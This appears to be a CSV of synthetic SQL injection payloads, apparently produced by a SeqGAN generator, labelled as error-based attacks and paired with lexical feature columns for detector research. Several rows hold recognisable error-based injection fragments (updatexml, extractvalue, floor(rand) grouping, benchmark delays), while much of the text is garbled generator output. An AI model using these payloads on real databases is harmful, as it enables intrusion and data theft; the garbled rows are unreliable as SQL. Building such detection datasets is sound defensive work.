label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""g__rhxul",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,25,522.0,41.0,3.9441491490159084,176.0,91.0,197.0,58.0,0.3371647509578544,0.1743295019157088,0.3773946360153257,0.1111111111111111,2.0,2.0,0.0,0.0,2.0,2.0,0.0,36.0,0.0,2.0,11.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,3.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"1'||  (  select 'yysyys"" like ""_sxjbh'  =  'yfxl",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,26,48.0,21.0,3.893854932309197,25.0,1.0,11.0,11.0,0.5208333333333334,0.020833333333333332,0.22916666666666666,0.22916666666666666,4.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||')        then  1x  ,  case when 8190   )    )' like ' FROM 4493  )  case :u  tabhraysuarsxaetr  (  ||chq  0  select     0x7171706a71,concat  3326  ,floor  =  3440  )   =  3074  ) from WHERE 1 AND concat  =  ,   )    4232   (  )   4386  || 0 1 by a or union selectccast FROM FROM (0x717a767a712   ax fromfrom 3931 or (  ||meuadr_  (  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,27,504.0,51.0,4.284372867958446,172.0,104.0,174.0,54.0,0.3412698412698413,0.20634920634920634,0.34523809523809523,0.10714285714285714,5.0,0.0,0.0,0.0,0.0,5.0,0.0,24.0,0.0,1.0,10.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,2.0,4.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"11""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""al",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,28,221.0,30.0,3.685378453067528,71.0,38.0,88.0,24.0,0.3212669683257919,0.17194570135746606,0.39819004524886875,0.1085972850678733,0.0,2.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%6085b"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,29,15.0,13.0,3.640223928941852,5.0,5.0,2.0,3.0,0.3333333333333333,0.3333333333333333,0.13333333333333333,0.2,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%3074a' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'elgle__s  (  rand  ||chr  c  (  (  rand   =   f  #,concat  0  ,0x717a767a71,  >  case,concat  (  ,0x717a767a71,0x717a767a71  ,  )  ||chrar   7158  ( or (  (  ||iN from from end  5023,0x717a767a71,concat  )   )    )    uns elseWHERE 6913   112n *i    AND end  ),1   )    )   then LIT  (  select    e information_schema else by     concat   ),0x717a767a71WHERE and 91731045",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,30,546.0,53.0,4.272284083815432,186.0,121.0,175.0,64.0,0.34065934065934067,0.2216117216117216,0.32051282051282054,0.11721611721611722,2.0,0.0,0.0,0.0,1.0,3.0,0.0,27.0,1.0,3.0,17.0,13.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,2.0,0.0,1.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0
attack,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ''  =  'a9173yz_xoyf_Hniad'  =  'sxuninenapadrnr.r  (  )  ||chr  (  select E  =  )  6825  5023  )   FROM 5192 else then me  thendxuCna d  from from  l  ||chr 5978r  113  ,   a       ||c  || 'i'  (  select A     when =  6t  113  =  ||ertaxsyuatsnt_sse  s ' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ' M du.e",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,31,910.0,51.0,4.048836200950793,306.0,126.0,353.0,125.0,0.3362637362637363,0.13846153846153847,0.3879120879120879,0.13736263736263737,10.0,0.0,0.0,0.0,2.0,8.0,0.0,58.0,0.0,6.0,7.0,41.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,9.0,3.0,0.0,5.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,22.0
attack,1%extractvalue  =  )   )     from FROM or 5584  (   =   and or or group 3051 end  ||chr  (  case)   xOrchro  casechr  (  ||choous   caseR group R else when.where  (  (  =  )    WHERE 3074   )     SELECT xtIdrNr  (  ||(  (  =  #,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,32,227.0,47.0,4.158141660955443,106.0,13.0,82.0,26.0,0.4669603524229075,0.05726872246696035,0.36123348017621143,0.1145374449339207,0.0,0.0,0.0,0.0,0.0,4.0,0.0,13.0,1.0,0.0,0.0,10.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.0,2.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1""   ||E  (  select where x  (  )    when  113  ||chr  6237  60552   )     (  select when   (  ||chr  (  ||chr  (  8190  ||chr  (  (  )  ||chr  (  ||chro  4607   (  (  (  =  )    4386  )  ,1     )  ,0x717a767a71,floor  (  ||chr  (  (  ||choun_raaal  4510  )     ||r  (  =  --am   (  ||IMs orIIz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,33,294.0,38.0,3.6992721298355553,78.0,39.0,122.0,55.0,0.2653061224489796,0.1326530612244898,0.41496598639455784,0.1870748299319728,0.0,1.0,2.0,0.0,0.0,2.0,0.0,24.0,0.0,1.0,3.0,26.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1btobu	6055u'  =  'askzgs' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'n"" like "",7562  )   er  (    =m",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,34,234.0,39.0,4.142654835341853,66.0,55.0,81.0,32.0,0.28205128205128205,0.23504273504273504,0.34615384615384615,0.13675213675213677,4.0,2.0,0.0,0.0,0.0,4.0,0.0,13.0,0.0,0.0,7.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,1'  ||chr  (  =  a enda   x or x 1 else AISLS.STNNNCT  (  )  )   (  =  )   from 3931 5584 by Ar  selecttdlasadube_tt_rouaaaaxtr.alq,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,35,131.0,39.0,4.3610322416048515,67.0,10.0,39.0,15.0,0.5114503816793893,0.07633587786259542,0.29770992366412213,0.11450381679389313,1.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,2.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '}T x  4493  chr  ((  ||ch  (  113  || else concat  =  (  having union information_schema1  concat  (  SELECT groupunion from union 5023  ||chr  (  (  >  rand  ||m  6237  (  113  ||  j0x7171706a71(  ||chr  d_r  (  select 4386  0x5c  )   ,1   )2 where  3931        ||chr  (  *2       SELECT 0x717a767a71,then 1 and 2017hcosys.e_rhr  (  (  rand  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,36,553.0,50.0,4.065708563577553,184.0,88.0,213.0,68.0,0.33273056057866185,0.15913200723327306,0.38517179023508136,0.12296564195298372,2.0,0.0,0.0,0.0,2.0,2.0,0.0,35.0,0.0,3.0,6.0,19.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,2.0,1.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
attack,"17864(  ||  rand  6237  )  ||chr  (  =  chrthrrNUNURE FROM(  6237(  benchmark  4232  case else :concat  SELECT end from group 1 endx  --   then 1 group when (  8190  6237em   (  6055er  (  ||chr  (  select FROMa.chr  (  4232i)     )      ,0x717a767a71ac,)   )    )   and FROM RINWNs union1xx..US.SE 1 concatr  (  SELECT from",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,37,324.0,53.0,4.6300496739474255,150.0,46.0,96.0,32.0,0.46296296296296297,0.1419753086419753,0.2962962962962963,0.09876543209876543,0.0,0.0,2.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,2.0,9.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,1%a'  =  'I,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,38,11.0,7.0,2.550340709546388,2.0,1.0,4.0,4.0,0.18181818181818182,0.09090909090909091,0.36363636363636365,0.36363636363636365,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )  4493  (  )  #l  --   WHERE by 5584 1x  4232  )   and    0   )     )    (  )  ,concat  ),  (  ,  ,0x717a767a71  ||ch  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,39,133.0,33.0,3.428481473271112,23.0,24.0,64.0,22.0,0.17293233082706766,0.18045112781954886,0.48120300751879697,0.16541353383458646,1.0,0.0,2.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,4.0,4.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"10x78    )    )  6825 having x 3931 end  #  || x DISTThsyeysust_r  er.r  (  ||chh  (  ||chr  (  >  =  *,t  6055  )and1 D cutlleet.chr  (  SELECT 8488 1 by   then by concat  (  ||chhr  select 6825 or else 11 3785 else * n concat  =  --   6913 0 a or (  t  (  ||chr  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,40,268.0,47.0,4.278585796822999,106.0,37.0,92.0,33.0,0.39552238805970147,0.13805970149253732,0.34328358208955223,0.12313432835820895,0.0,0.0,2.0,0.0,2.0,2.0,0.0,11.0,0.0,1.0,1.0,17.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1""7469       )   3440  ch.chr  113  --  --_lchs 0x78o_  *)  )   x where 1 1aU DIINT  (   x  >  '  ,,concat  113  select end  ,2   )    ) selectui2  )   x       || drost_  (  casechro_r  (  ||chr  (  0  select or 1 or 0FROM 1  1 vtqunt  122  >  ,floor  or 6082   from chr  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,41,272.0,49.0,4.073264428554792,100.0,34.0,106.0,32.0,0.36764705882352944,0.125,0.3897058823529412,0.11764705882352941,1.0,1.0,4.0,0.0,1.0,0.0,0.0,10.0,0.0,4.0,4.0,11.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1 (  (  =  )    ,floor  select   (  ||chr  (  ||ss DIM when   n     WHERE end  )  ,  5023  )  (  )   T    from AND end  || ku  = or 3440  0x7171706a71   (  )    )   or union ININCT groupMua when   (  select else tiana  (  122  )   ortr  (  )   then by m     >  )       thenchr  chr  (  *  ||chhrrhr.as",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,42,301.0,50.0,3.9530117929277284,119.0,22.0,126.0,34.0,0.3953488372093023,0.07308970099667775,0.4186046511627907,0.11295681063122924,0.0,0.0,0.0,0.0,1.0,2.0,0.0,19.0,0.0,0.0,2.0,12.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,1.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,1%b,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,43,3.0,3.0,1.584962500721156,1.0,1.0,0.0,1.0,0.3333333333333333,0.3333333333333333,0.0,0.3333333333333333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"by' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'xup.inadr.r  (  (  ||chhr  (  select from when   select   (  )   or 1 group6055  )  having else when union  hr  6913    )  ,0x717a767a71,  || concat  (  select by by end  )  ,v or end  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,44,469.0,42.0,4.17464527202088,192.0,60.0,163.0,54.0,0.4093816631130064,0.1279317697228145,0.34754797441364604,0.11513859275053305,2.0,0.0,2.0,0.0,2.0,2.0,0.0,28.0,0.0,2.0,8.0,11.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,1.0,1.0,3.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
attack,"-%}0x5c(  (  (  select from 3785    =  )   or union 4493  )  ,floor  a union end  select 8488 r  at  113  ||l when   (  ||chr  (  =     (  )floor  case 0   ||s 1 else DINi. union information_schema or or 1 end   fromx or DMI. DIMIISST end   FROMix  selectn  )  ||U   (  SELECT by select 5023   case when   (  (     ,floor  =  0x717a767a71,concat",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,45,345.0,53.0,4.412112435920037,168.0,33.0,111.0,33.0,0.48695652173913045,0.09565217391304348,0.3217391304347826,0.09565217391304348,0.0,0.0,1.0,0.0,0.0,3.0,0.0,13.0,1.0,1.0,3.0,12.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,3.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,1'  )   or orx and R E  select from  )  )     having N or     case D group 3051 DIM t_r.as.s  (  0 )     (  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,46,110.0,36.0,3.844926147017727,47.0,6.0,45.0,12.0,0.42727272727272725,0.05454545454545454,0.4090909090909091,0.10909090909090909,1.0,0.0,2.0,0.0,0.0,0.0,0.0,6.0,0.0,1.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1""   )   (  )    ,       select 1 D by and by 6055hr  (  ||chrhr  (  ||Uchr  (  ||cr   group( x  )  )     then concat  select   113  (   )  4232  )    )     ))   (  ,0x717a767a71,floorr  achr  or  (  *2   thenselect do.chr  113  0  select select 1 1 c  a dchr  (  select concat  )  *  ||chr  (  ' like '     (  =  ||c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,47,317.0,40.0,3.7522376779586755,117.0,29.0,130.0,41.0,0.36908517350157727,0.0914826498422713,0.41009463722397477,0.12933753943217666,2.0,1.0,0.0,0.0,2.0,1.0,0.0,21.0,0.0,0.0,3.0,13.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1'||  (  select 'rieantT  select by H or 1 AE1 else else end   )  (  8382  (  =  select  (  113  select and AND from (  (  ||  (  =  ||chr  select 30514386    ,0x717a767a71,floor  (  =  6055ui  ,0x717a767a71then5856  )   --r  4493  5023   m)  4232  113  )   x   (  )a  || '   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'T wherer  113 8877 ||.extractvalue  (  =  )   0 x when   (  6055  )     )   then RNc",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,48,529.0,48.0,4.083602867828722,172.0,94.0,200.0,63.0,0.32514177693761814,0.1776937618147448,0.3780718336483932,0.11909262759924386,4.0,0.0,2.0,0.0,0.0,4.0,0.0,35.0,0.0,0.0,7.0,16.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  's    ,SELECT D group unionIEWHERE.NT by AND 9891     FROMr   group AND x  =  )   )   SELECT 1 1 x dyUhr  (  )   (  0)     )   (  )   )|| dxer  (  )     )  casechradr  (0x717a767a71n    )   then1 concatr  122  )     concat  ||chrr  (  ||chr  (    ||chhr  (  (  =  and   from x select union when  (  ||chr  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,49,487.0,54.0,3.952305570097028,169.0,55.0,203.0,60.0,0.3470225872689938,0.11293634496919917,0.41683778234086244,0.12320328542094455,2.0,0.0,0.0,0.0,0.0,3.0,0.0,38.0,0.0,0.0,6.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,1.0,0.0,1.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"-'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'Y56060--It.r  (  =  ||chros AINT  (  ||  8382",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,50,367.0,47.0,4.052377297701205,115.0,63.0,142.0,47.0,0.3133514986376022,0.17166212534059946,0.3869209809264305,0.12806539509536785,2.0,0.0,3.0,0.0,2.0,2.0,0.0,26.0,0.0,0.0,6.0,12.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
